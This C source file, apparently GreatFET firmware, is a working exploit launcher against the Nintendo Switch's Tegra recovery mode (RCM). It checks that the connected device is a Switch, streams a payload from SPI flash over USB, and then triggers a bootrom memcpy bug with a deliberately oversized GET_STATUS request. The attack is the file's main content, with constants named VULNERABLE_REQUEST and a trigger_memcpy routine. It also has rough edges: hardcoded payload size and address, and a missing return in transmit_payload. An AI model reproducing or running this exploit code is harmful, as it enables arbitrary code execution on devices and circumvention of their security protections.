/*
 * This file is part of GreatFET
 */

#include <stddef.h>
#include <errno.h>
#include <stdint.h>

#include <libopencm3/cm3/vector.h>
#include <libopencm3/lpc43xx/m4/nvic.h>

#include <greatfet_core.h>
#include <usb_type.h>

#include <usb.h>
#include <usb_host.h>
#include <usb_queue_host.h>
#include <usb_registers.h>

#include <onboard_flash.h>
#include <spiflash.h>

#include "usb_host_stack.h"

// Magic numbers for the RCM communications.
enum {
	USB_ADDRESS_DEFAULT  = 0,
	USB_ENDPOINT_NUMBER_CONTROL = 0,
	USB_ENDPOINT_NUMBER_RCM = 1,

	RCM_ACTIVE_ADDRESS = 1,
	RCM_ACTIVE_CONFIGURATION = 1,
	RCM_MAX_PACKET_SIZE_EP0 = 64,
	RCM_MAX_PACKET_SIZE_RCM_EP_HIGH = 512,
	RCM_MAX_PACKET_SIZE_RCM_EP_FULL = 64,

	SWITCH_RCM_VID = 0x0955,
	SWITCH_RCM_PID = 0x7321,

	RCM_DEVICE_INFO_SIZE = 16,

	VULNERABLE_REQUEST_TYPE = 0x82,
	VULNERABLE_REQUEST = 0,
	VULNERABLE_REQUEST_LENGTH = 0x7000,

	USB_TRANSMISSION_ATOM = 0x1000,

	/* XXX get rid of this and figure this out or hardcode a large value */
	PAYLOAD_ADDRESS = 0x80000,
	XXX_PAYLOAD_SIZE_XXX = 0xd000,
};

// Buffer used to store USB chunks as we read them.
uint8_t usb_buffer[USB_TRANSMISSION_ATOM];

// Endpoint objects -- represent our USB data channels.
ehci_queue_head_t *control_endpoint = NULL;
ehci_queue_head_t *rcm_endpoint = NULL;

usb_peripheral_t usb_peripherals[] = {
	{ .controller = 0, },
	{ .controller = 1, }
};


void set_up_host_controller(void)
{
	// Initialize the USB host controller.
	usb_host_initialize_storage_pools();

	// Set up the device in host mode...
	usb_controller_reset(&usb_peripherals[1]);
	usb_host_init(&usb_peripherals[1]);

	// Provide VBUS to the target, if possible.
	// TODO: disable this when we're not host powered
	usb_provide_vbus(&usb_peripherals[1]);

	// Enable the USB controller-- this will allow start the point
	// where interrupts can be issued.
	usb_run(&usb_peripherals[1]);
}


void wait_for_device(void)
{
	// Reset the device...
	delay(100 * 1000);
	usb_host_reset_device(&usb_peripherals[1]);
	delay(100 * 1000);

	// Repeatedly reset the device until it shows up.
	// TODO: Do we need to do this? Are our delays just off?
	while (!(USB_REG(1)->PORTSC1 & USB0_PORTSC1_H_CCS)) {
		// Reset the device...
		delay(100 * 1000);
		usb_host_reset_device(&usb_peripherals[1]);
		delay(100 * 1000);
	}
}


void initialize_endpoints(uint16_t address)
{
	// Set up the standard control endpoint.
	control_endpoint = usb_host_set_up_asynchronous_endpoint_queue(
		&usb_peripherals[1],
		control_endpoint,
		address,
		USB_ENDPOINT_NUMBER_CONTROL,
		USB_SPEED_FULL, // TODO: switch this to the other controller, and High speed
		true,  // This is a control endpoint.
		false, // We'll manually specify the data toggle.
		RCM_MAX_PACKET_SIZE_EP0);

	// Set up the RCM endpoint; used for the actual recovery mode data.
	rcm_endpoint = usb_host_set_up_asynchronous_endpoint_queue(
		&usb_peripherals[1],
		rcm_endpoint,// Allocate a new endpoint.
		address,
		USB_ENDPOINT_NUMBER_RCM,
		USB_SPEED_FULL, // TODO: switch this to the other controller, and High speed
		false, // This is NOT a control endpoint.
		true,  // We'll let the controller handle DATA toggling for us.
		RCM_MAX_PACKET_SIZE_RCM_EP_FULL);
}


/**
 * Validates that the connected device is a Nintendo Switch.
 *
 * @return 0 on success, or an error code on failure
 */
int validate_connected_device(void)
{
	// Read the device descriptor, which contains our VID and PID.
	usb_descriptor_device_t device_descriptor;
	usb_host_read_device_descriptor(&usb_peripherals[1], control_endpoint, &device_descriptor);

	// If our VID or PID don't match, fail out.
	if (device_descriptor.idVendor != SWITCH_RCM_VID)
		return EINVAL;
	if (device_descriptor.idProduct != SWITCH_RCM_PID)
		return EINVAL;

	return 0;
}


/**
 * Read the Device's Info structure via RCM.
 *
 * @param device_info Out argument that recieves the device information.
 *		Should point to a 16-byte buffer.
 * @return 0 on success, or an error code on failure
 */
int rcm_read_device_info(void *device_info)
{
	int length_read =
		usb_host_read_from_endpoint(&usb_peripherals[1], rcm_endpoint,
		device_info, RCM_DEVICE_INFO_SIZE);

	if (length_read == 16)
		return 0;
	else
		return -length_read;
}

/**
 * Main transmit loop. Reads the f-g payload from flash memory and transmits it
 * to the target device over USB.
 */
int transmit_payload(void)
{
	int rc;

	// XXX: FIXME; don't hardcode
	int data_remaining = XXX_PAYLOAD_SIZE_XXX;
	uintptr_t data_address = PAYLOAD_ADDRESS;

	// Transmit all of the payload data we have.
	while (data_remaining > 0) {

		// Read one buffer size of payload into memory...
		spiflash_read(&spi_flash_drv, data_address, 
				sizeof(usb_buffer), usb_buffer);

		// ... transmit to the RCM device ...
		rc = usb_host_send_on_endpoint(&usb_peripherals[1], rcm_endpoint,
				usb_buffer, sizeof(usb_buffer));
		if (rc)
			return rc;

		// Advance in our transmission.
		data_remaining -= sizeof(usb_buffer);
		data_address   += sizeof(usb_buffer);
	}
}


/**
 * Trigger the vulnerability itself by sending a long-length GET_STATUS
 * request to the endpoint. See the f-g report for more info. :)
 */
int trigger_memcpy(void)
{
	// Send a GET_STATUS request to the endpoint.
	return usb_host_control_request(&usb_peripherals[1], control_endpoint, 
		VULNERABLE_REQUEST_TYPE, VULNERABLE_REQUEST, 0, 0, 
		VULNERABLE_REQUEST_LENGTH, NULL);
}


int main(void)
{
	int rc;
	uint8_t device_info[RCM_DEVICE_INFO_SIZE];

	// Perform the core GreatFET setup.
	cpu_clock_init();
	cpu_clock_pll1_max_speed();
	pin_setup();
	rtc_init();

	// Set up the SPI flash we'll read the payload from.
	spi_bus_start(spi_flash_drv.target, &ssp_config_spi);
	spiflash_setup(&spi_flash_drv);

	// Start communications and wait for a device to connect.
	set_up_host_controller();
	wait_for_device();

	// Ensure we talk only to Nintendo Switch.
	initialize_endpoints(USB_ADDRESS_DEFAULT);
	rc = validate_connected_device();
	if (rc) {
		led_on(LED4);
		return rc;
	}

	// Set the device's address to something other than the default.
	rc = usb_host_set_address(&usb_peripherals[1], control_endpoint, RCM_ACTIVE_ADDRESS);
	if (rc) {
		led_on(LED4);
		return rc;
	}
	initialize_endpoints(RCM_ACTIVE_ADDRESS);

	// Apply this device's configuration, so it can talk RCM.
	rc = usb_host_switch_configuration(&usb_peripherals[1],
			control_endpoint, RCM_ACTIVE_CONFIGURATION);
	if (rc) {
		led_on(LED4);
		return rc;
	}

	// Read the attached Tegra's Device Hardware Info, including the Device ID.
	rc = rcm_read_device_info(device_info);
	if (rc) {
		led_on(LED4);
		return rc;
	}
	led_on(LED1);

	// Read and send the payload.
	rc = transmit_payload();
	if (rc) {
		led_on(LED4);
		return rc;
	}

	led_on(LED2);

	// Trigger the RCM vulnerability.
	rc = trigger_memcpy();
	if (rc) {
		led_on(LED4);
		return rc;
	}

	led_on(LED3);
	while(true);
	return 0;
}
